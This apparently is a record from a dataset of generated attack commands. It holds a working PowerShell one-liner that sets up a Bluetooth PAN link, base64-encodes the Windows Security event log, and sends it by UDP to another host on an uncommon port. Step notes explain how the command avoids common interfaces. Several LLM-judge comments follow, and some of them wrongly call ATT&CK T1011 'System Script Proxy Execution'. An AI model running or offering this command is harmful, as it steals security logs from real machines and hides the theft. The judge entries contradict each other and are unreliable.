command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\System32\winevt\Logs\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()
explanation: Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate medium.
Configure the Bluetooth IP using netsh, avoiding common interfaces.
Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.
Send base64 data to a high-numbered, uncommon UDP port.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with correct separators, balanced quoting/parentheses, valid cmdlets and .NET calls, and proper argument usage.
llm_judgments.semantic_justification: It establishes a Bluetooth PAN and exfiltrates data via UDP rather than abusing trusted/signed system scripts via cscript/wscript as described, and also likely requires elevated privileges for netsh and reading Security.evtx.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and method calls.
llm_judgments.semantic_justification: The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a Bluetooth connection and exfiltrating event log data over UDP, though it uses direct exfiltration rather than proxying through a system script as described in the technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid command separators, and proper use of external executables and their arguments.
llm_judgments.semantic_justification: The command performs direct execution of an external executable and standard PowerShell operations, entirely failing to demonstrate the 'System Script Proxy Execution' mechanism (e.g., using cscript/wscript with legitimate scripts) that defines MITRE ATT&CK T1011.
